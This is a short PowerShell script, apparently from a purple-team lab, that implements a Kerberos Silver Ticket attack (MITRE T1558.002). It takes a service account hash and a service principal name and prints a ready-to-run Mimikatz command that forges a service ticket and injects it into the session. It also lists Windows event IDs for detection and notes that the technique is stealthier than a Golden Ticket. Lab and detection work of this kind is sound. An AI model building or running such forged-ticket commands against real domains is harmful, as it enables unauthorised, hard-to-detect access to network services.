<#
.SYNOPSIS
    Silver Ticket Attack Implementation (MITRE ATT&CK: T1558.002)

.DESCRIPTION
    Creates forged Kerberos service tickets for specific services using service account hashes.
    Silver Tickets provide persistent access to specific services without needing DC communication.

.NOTES
    Author: Purple Team Lab
    MITRE ATT&CK: T1558.002
    Date: 2024-01-14

    Detection: Event IDs 4624, 4634, 4769, 4770

.EXAMPLE
    .\silver_ticket.ps1 -ServiceHash 8846f7eaee8fb117ad06bdd830b7586c -SPN CIFS/WS01.PURPLETEAM.LAB

#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]$ServiceHash,

    [Parameter(Mandatory=$true)]
    [string]$SPN,

    [Parameter(Mandatory=$false)]
    [string]$Domain = "PURPLETEAM.LAB",

    [Parameter(Mandatory=$false)]
    [string]$User = "Administrator"
)

Write-Host "[*] Silver Ticket Attack - MITRE ATT&CK T1558.002"
Write-Host "[*] Service: $SPN"
Write-Host "[*] Service Hash: $ServiceHash"

# Mimikatz command
$cmd = "kerberos::golden /domain:$Domain /sid:S-1-5-21-XXX /target:$SPN /service:cifs /rc4:$ServiceHash /user:$User /ptt"
Write-Host "`n[*] Mimikatz Command:"
Write-Host $cmd

Write-Host "`n[+] Silver ticket provides access to specific service only"
Write-Host "[+] More stealthy than Golden Ticket (no DC communication)"
